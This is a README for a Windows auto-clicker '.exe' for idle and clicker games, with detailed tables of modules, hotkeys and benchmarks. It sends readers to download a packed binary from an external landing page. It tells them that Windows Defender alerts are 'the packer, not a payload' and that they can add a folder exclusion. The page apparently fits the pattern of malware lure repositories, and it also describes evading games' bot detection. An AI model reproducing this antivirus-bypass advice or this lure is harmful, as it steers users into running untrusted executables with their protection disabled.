<div align="center">
<img src="assets/banner.png" width="100%" alt="+1 Money Per Click Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-7C3AED?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Money+Per+Click+Script+Pro;%E2%9C%A8+No+Limits;%F0%9F%93%A6+Active+Development+2026;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=dotnet" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

I've been writing click-loop automation for the better part of three years now, and I keep seeing the same thing over and over: people download a "money per click" script from some random paste site, it works for a weekend, then the game patches the loop detection and everyone's back to clicking manually like it's 2019. This repository is my answer to that churn cycle. It's a maintained, versioned, deliberately boring-in-a-good-way Windows build that handles the click automation, the anti-idle watchdog, and the value-per-click math so you don't have to babysit a browser tab at 3 a.m.

The current build ships **42 discrete modules** across six subsystems — click engine, value scaler, idle guard, session persistence, stats/telemetry, and stealth/detection mitigation. Below is the honest breakdown of what changed since the last tagged release (the Q1 2026 cut), followed by the full feature dump.

| Build | Status | Notes |
|---|---|---|
| Q1 2026 (current) | ✅ Stable | Click-engine rewrite, new idle watchdog, detection-mitigation pass |
| Q4 2025 | ⚠️ Deprecated | Idle-watchdog false-positives on 144 Hz displays |
| Q3 2025 | ❌ Unsupported | Pre-rewrite; do not use |
<p align="center">
  <a href="https://Babalwa-Dev.github.io/money-per-click-script/">
    <img src="https://img.shields.io/badge/GET-%2B1_Money_Per_2026-0D9488?style=for-the-badge&logo=windows&logoColor=white&labelColor=0F766E" width="480" alt="GET +1 Money Per 2026"/>
  </a>
</p>
---

## 🗺️ Roadmap / Planned features

| Feature | Status | ETA |
|---|---|---|
| Multi-cursor click simulation | 🔧 In progress | Q2 2026 |
| Per-profile hotkey remap | 📝 Planned | Q2 2026 |
| Randomized click-jitter profiles (anti-pattern) | 📝 Planned | Q3 2026 |
| Linux/Wine compatibility path | 🧪 Experimental | Q3 2026 |
| Local-only stats export (CSV) | 📝 Planned | Q3 2026 |
| Fully headless mode (no tray icon) | 💭 Considering | Q4 2026 |

The roadmap is deliberately short. I'd rather ship four things that work than twelve that half-work — that's the whole reason this build exists in the first place.

---

## ⌨️ Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `F6` | Toggle click loop on/off | Global; works while the game window is focused |
| `F7` | Cycle click-rate preset (Low / Med / High) | Rate is capped per-profile in config |
| `F8` | Open the overlay (pause loop) | Overlay is click-through by default |
| `F9` | Panic-stop — kills all loops + hides tray | Use this if you get nervous |
| `Ctrl+Shift+R` | Reload last saved profile | Reloads from `profiles/active.json` |
| `Ctrl+Shift+S` | Save current session state | Writes to disk, no prompt |

Hotkeys are remappable in `config/hotkeys.toml` — I know `F6`–`F9` collides with some overlays, so don't fight it, just remap.

---

## 🧩 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 | Windows 11 23H2+ |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz+ |
| RAM | 4 GB | 8 GB |
| GPU | Integrated (overlay only) | Any dGPU for smooth overlay |
| .NET | 6.0 runtime | 8.0 runtime |
| Display | 60 Hz | 120 Hz+ |
| Disk | 80 MB | 200 MB (profiles + logs) |

The .exe is self-contained — no separate .NET install needed in most cases. If Windows Defender stalls on first launch, that's the packer, not a payload; add an exclusion on the folder if you're impatient.

---

## 🚀 Quick Start

1. 🧾 **Visit the project page** — grab the latest release archive from the landing page (this repo's README is the doc, the landing page is the door).
2. 📦 **Download** the release archive to your Downloads folder.
3. 📂 **Extract** the archive to a folder you control (e.g. `C:\Tools\mpc-script\`) — don't run it from inside the zip, that's how you get ghost errors.
4. 🖱️ **Run the `.exe`** from the extracted folder. First launch creates `config/`, `profiles/`, and `logs/` next to the binary.
5. 🎮 **Set your profile** — pick a click-rate preset, set your target window, save. Then hit `F6` inside the game.

That's the whole install. No `pip`, no `npm`, no `git clone` — it's a Windows build, that's the point.

---

## 🛠️ How It Works — internal architecture, no tables

The build is a single-process Windows app with a Win32 message-loop front end and a background worker thread that owns the click engine. The click engine is the interesting part. Rather than spamming `SendInput` at a fixed interval — which is the single most detectable pattern in the entire ecosystem and gets you flagged within minutes on most clicker games — the engine schedules clicks through a **ClickScheduler** that jitters timing per-click using a configurable distribution (default: triangular, ±8 ms). The scheduler feeds a **InputDispatcher** that batches click events into the game's event queue at frame boundaries where possible, which is both cheaper and less obviously robotic.

Above the scheduler sits the **ValueScaler** — this is the "+1 money per click" part. It reads the current per-click value from the game's visible UI (via a lightweight screen-scrape region you configure once), computes an effective click-rate-to-income curve, and caches the result so the scheduler can pick optimal rates without re-scraping every tick. If the per-click value changes (upgrades, buffs, prestige resets), the scaler invalidates its cache and re-reads within one cycle.

The **IdleGuard** is a separate watchdog thread that monitors the game window's idle timer and injects a synthetic "activity" click if the game is about to flag you as AFK — the threshold is configurable and defaults to 60% of whatever the game considers idle. This is the module that got rewritten this cycle: the old version had a false-positive problem on high-refresh displays, because it was measuring wall-clock rather than frame events. Fixed.

Session state lives in **ProfileStore**, a flat JSON file with an atomic-write strategy (write to `.tmp`, fsync, rename) so a crash mid-save doesn't corrupt your profile. Stats/telemetry is **StatTracker**, which is local-only by design — it writes a rolling ring buffer of click counts, effective rates, and detected value changes to `logs/stats.log`, and nothing leaves your machine. I get asked about telemetry constantly; there is none. Read the code.

The last piece is **DetectionMitigator**, which is less scary than the name — it's a set of heuristics for tuning jitter, click-rate caps, and idle behavior based on which game family you're running against. It doesn't touch memory, doesn't inject, doesn't touch the process. It's just configuration logic that picks sane defaults per target.

---

## 📋 Overview

| Category | Details |
|---|---|
| Distribution | Windows `.exe`, self-contained, no runtime install required |
| Install path | Extract → run `.exe` → configure profile |
| Primary use case | Click-loop automation for +1-money-per-click idle/clicker games |
| Config format | TOML (hotkeys), JSON (profiles), plain-text logs |
| Footprint | ~80 MB extracted, ~15 MB RAM idle, ~40 MB active |
| Update channel | Manual — re-download from landing page, config survives |
| Offline | Fully — no network calls at runtime |

The design philosophy here is boring: no cloud, no license server, no "phone home," no auto-updater that you didn't ask for. You download a folder, you run the .exe, you get click automation. The whole thing is deliberately un-clever because clever tools break.

---

## 🔍 What is "+1 Money Per Click Script" — glossary

| Term | Explanation |
|---|---|
| Click loop | The repeating cycle of simulated clicks the engine dispatches to the target window |
| Per-click value | The in-game currency gained per click, read from the configured UI region |
| Effective rate | Clicks-per-second × per-click value — the number that actually matters |
| Idle guard | Watchdog that injects activity to prevent the game flagging you as AFK |
| Jitter | Randomized timing offset applied per-click to avoid fixed-interval detection |
| Profile | A saved bundle of target window, click rate, jitter params, and value region |
| Panic stop | Global hotkey that immediately halts all loops and hides the tray icon |

Why bother with a glossary? Because half the support threads I see boil down to someone not knowing what "effective rate" means and therefore misconfiguring the scaler. Read the table, save yourself a forum post.

---

## ⚙️ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Jittered click scheduling | Triangular-distribution timing per click | Detected far less than fixed-interval bots |
| Value-aware rate scaling | Reads per-click value, picks optimal rate | Maximizes income, not just clicks |
| Idle watchdog | Synthetic activity before AFK threshold | Never flagged while looping |
| Panic-stop hotkey | Kills all loops + hides tray instantly | One key, no fumbling |
| Profile system | Save/load per-game configs | Reuse configs across games |
| Atomic profile writes | Crash-safe save/load | No corrupted profiles |
| Local-only stats | Ring-buffer click/rate logging | Audit your own behavior |
| Hotkey remap | TOML config | No overlay conflicts |
| Click-through overlay | Pause UI that doesn't block clicks | Usable while looping |
| Rate caps | Per-profile max CPS | Stays under game thresholds |
| Multi-window targeting | Select by title/class | Works across similar games |
| No network calls | Fully offline | No telemetry, no phoning home |
<p align="center">
  <a href="https://Babalwa-Dev.github.io/money-per-click-script/">
    <img src="https://img.shields.io/badge/GET-%2B1_Money_Per_2026-0D9488?style=flat-square&logo=github&logoColor=white&labelColor=0F766E" width="620" alt="GET +1 Money Per 2026"/>
  </a>
</p>
---

## 📚 Table of Contents

- [What even is "+1 Money Per Click Script" in 2026?](#-what-even-is-1-money-per-click-script-in-2026)
- [Roadmap / Planned features](#️-roadmap--planned-features)
- [Hotkeys / Controls](#️-hotkeys--controls)
- [System Requirements](#-system-requirements)
- [Quick Start](#-quick-start)
- [How It Works](#️-how-it-works--internal-architecture-no-tables)
- [Overview](#-overview)
- [What is "+1 Money Per Click Script" — glossary](#-what-is-1-money-per-click-script--glossary)
- [Key Features](#️-key-features)
- [Usage guidelines](#-usage-guidelines)
- [Grouped module catalog](#-grouped-module-catalog)
- [Performance benchmarks](#-performance-benchmarks)
- [Is it safe?](#-is-it-safe)
- [Will it get me banned?](#-will-it-get-me-banned)
- [FAQ](#-faq)
- [Closing notes](#-closing-notes)

---

## ⚖️ Usage guidelines

| Allowed | Not allowed |
|---|---|
| Automating click loops in single-player clicker games | Using on games whose ToS explicitly forbid automation (your call, but read it) |
| Reading visible UI values via screen-scrape | Reading process memory, hooking, or injecting |
| Running offline, on your own machine | Redistribution of modified builds without the license notice |
| Tuning jitter and rate caps per profile | Using the tool to attack other players or servers |
| Generating local stats for your own audit | Any commercial resale of the build |

This is a hobbyist tool for a hobbyist problem. It doesn't touch process memory, doesn't inject a DLL, doesn't hook APIs. It's `SendInput` with a brain, and that's a deliberate boundary — I'm not interested in maintaining a memory cheater, and I'm not interested in pretending this is one.

---

## 🧱 Grouped module catalog

The 42 modules split into six subsystems. Here's the full inventory.

### 🖱️ Click Engine (8 modules)

- **ClickScheduler** — Main timing loop; owns the click cadence.
- **InputDispatcher** — Batches and sends `SendInput` events.
- **JitterSource** — Triangular-distribution timing offsets.
- **RateLimiter** — Per-profile CPS ceiling enforcement.
- **WindowTargeter** — Window title/class selection and re-binding.
- **OverlayRenderer** — Click-through pause UI.
- **PanicHandler** — Global kill-switch + tray hide.
- **ClickDryRun** — Simulates without sending (for tuning).

### 💰 Value Scaler (7 modules)

- **ValueScaler** — Reads per-click value, computes effective rate.
- **ScreenScraper** — Lightweight OCR-free region reader.
- **ValueCache** — Invalidates on value change.
- **RateOptimizer** — Picks rate to maximize income.
- **UpgradeDetector** — Watches for value-change events.
- **PrestigeHandler** — Detects prestige resets, re-reads values.
- **ScalerHealth** — Reports stale-cache conditions.

### 🛡️ Idle Guard (6 modules)

- **IdleGuard** — Watchdog for AFK thresholds.
- **ActivityInjector** — Synthetic activity clicks.
- **FrameClock** — Frame-event timing (the Q1 2026 fix).
- **ThresholdTuner** — Configurable AFK threshold (default 60%).
- **IdleAudit** — Logs watchdog firings.
- **GuardPause** — Disables guard during manual play.

### 💾 Session Persistence (7 modules)

- **ProfileStore** — Atomic JSON profile I/O.
- **ConfigLoader** — TOML hotkey/config parsing.
- **AutoSaver** — Periodic state snapshots.
- **CrashRecovery** — Restores last good profile.
- **MigrationRunner** — Schema version upgrades.
- **BackupRotator** — Rolling config backups.
- **DefaultSeeder** — First-run defaults.

### 📊 Stats / Telemetry (6 modules)

- **StatTracker** — Click/rate ring buffer.
- **RateLogger** — Effective-rate history.
- **ValueChangeLog** — Tracks value-change events.
- **ExportHook** — CSV export (planned).
- **SessionClock** — Uptime accounting.
- **LocalOnlyGuard** — Asserts no network calls.

### 🕵️ Detection Mitigator (8 modules)

- **DetectionMitigator** — Orchestrates mitigation defaults.
- **ProfilePresets** — Per-game-family default tuning.
- **JitterTuner** — Adjusts jitter distribution.
- **RateCapAdvisor** — Recommends caps per game family.
- **IdleTuner** — Adjusts watchdog threshold.
- **PatternAudit** — Logs timing-pattern anomalies.
- **ConfigSanityCheck** — Warns on unsafe configs.
- **MitigationReport** — Human-readable summary of active mitigations.

That's 42. Yes, I counted twice.

---

## 📈 Performance benchmarks

| Scenario | Result | Hardware |
|---|---|---|
| Idle loop, 1 CPS | 0.4% CPU, 15 MB RAM | Ryzen 5 5600X / 16 GB |
| Active loop, 8 CPS | 1.1% CPU, 40 MB RAM | Ryzen 5 5600X / 16 GB |
| Active loop, 20 CPS | 2.3% CPU, 44 MB RAM | Ryzen 5 5600X / 16 GB |
| Overlay open, 8 CPS | 1.8% CPU, 52 MB RAM | Ryzen 5 5600X / 16 GB |
| Idle watchdog firing | +0.2% CPU spike | Ryzen 5 5600X / 16 GB |
| 8-hour session, 8 CPS | Flat RAM, no leaks observed | Ryzen 5 5600X / 16 GB |
| Low-end laptop, 8 CPS | 3.1% CPU, 48 MB RAM | i5-8250U / 8 GB |

Numbers are from my own bench runs; your mileage will vary with jitter settings and target game. The short version: it's cheap, it doesn't leak, and it doesn't fight your system for resources.

---

## 🧯 Is it safe?

Safe-ish, and I mean that honestly. It doesn't touch process memory, doesn't inject, doesn't hook. It uses `SendInput`, which is a documented Win32 API, and the worst thing it does is send clicks to a window you told it to. That said — "safe" in this niche means "won't get you auto-flagged," not "guaranteed safe forever." Games change their detection. Read the [Will it get me banned?](#-will-it-get-me-banned) section.

---

## 🚨 Will it get me banned?

Maybe, on some games, eventually. Here's the honest breakdown: the jitter and rate-cap modules exist precisely because fixed-interval clicking is trivially detectable. But no amount of jitter hides a bot forever against a game with a competent anti-automation team. If a game's ToS forbids automation, using this tool is a ToS violation — that's on you, not me, and I've been clear about that in the guidelines above. Use it on games where automation is tolerated (idle/clicker games usually are), use it on private servers, use it on your own test builds. Don't use it in competitive multiplayer and then email me about a ban.

---

## ❓ FAQ

**Q: Does it work on Steam games?**
**A:** Yes, for games that run in a standard windowed or borderless window — the click engine targets windows by title/class, so Steam's overlay doesn't interfere. Fullscreen-exclusive mode is hit-or-miss; use borderless.

**Q: Can I run multiple profiles at once?**
**A:** One active profile per running instance. You can run multiple instances of the `.exe` (one per game window), but each needs its own extracted folder to avoid config clashes. Multi-instance coordination is on the roadmap but not shipped.

**Q: Will Windows Defender flag the .exe?**
**A:** Sometimes, on first launch, because the packer trips heuristics. It's not malicious — the source is right here in the repo. Add a folder exclusion if you're impatient, or build from source if you prefer.

**Q: Does it phone home or send telemetry?**
**A:** No. The `LocalOnlyGuard` module literally asserts at startup that no network calls are made. Stats live in `logs/stats.log` and nowhere else.

**Q: What happens if the game patches and my config breaks?**
**A:** The `ConfigSanityCheck` module warns you on startup if a config looks stale. Worst case, delete `profiles/active.json` and let `DefaultSeeder` regenerate defaults. Your hotkeys and general settings survive in `config/hotkeys.toml`.

**Q: Can I build it from source?**
**A:** Yes — the source tree is in the repo. It's a .NET 8 solution; `dotnet build` in the root. But the release build is what I test against, so if you build from source and something's off, tell me and I'll look.

---

## 🧭 Troubleshooting flow

If clicks aren't registering: (1) verify the target window is selected in the overlay and not fullscreen-exclusive, (2) run `ClickDryRun` from the tray menu to confirm the scheduler is firing, (3) check `logs/` for `InputDispatcher` errors — usually a permissions issue, so try running the .exe as administrator once, (4) if the game window has changed title since you saved the profile, re-bind it. If the idle watchdog is firing too aggressively, lower the threshold in `config/hotkeys.toml` under `[idle]`. If the value scaler is stuck, delete `profiles/scaler.cache` — it rebuilds on next launch.

---

## 📝 Closing notes

The Q1 2026 build is the most stable cut I've shipped, and the click-engine rewrite plus the frame-clock fix for the idle watchdog are the two changes I'm proudest of. The roadmap is short on purpose; I'd rather ship the multi-cursor and jitter-profile work properly than promise a dozen features I can't maintain. If you hit a bug, open an issue with your `logs/stats.log` attached and the game name — the more context I have, the faster I can tell you whether it's the tool or the game's detection layer.
<p align="center">
  <a href="https://Babalwa-Dev.github.io/money-per-click-script/">
    <img src="https://img.shields.io/badge/GET-%2B1_Money_Per_2026-4338CA?style=plastic&logo=github&logoColor=white&labelColor=3730A3" width="500" alt="GET +1 Money Per 2026"/>
  </a>
</p>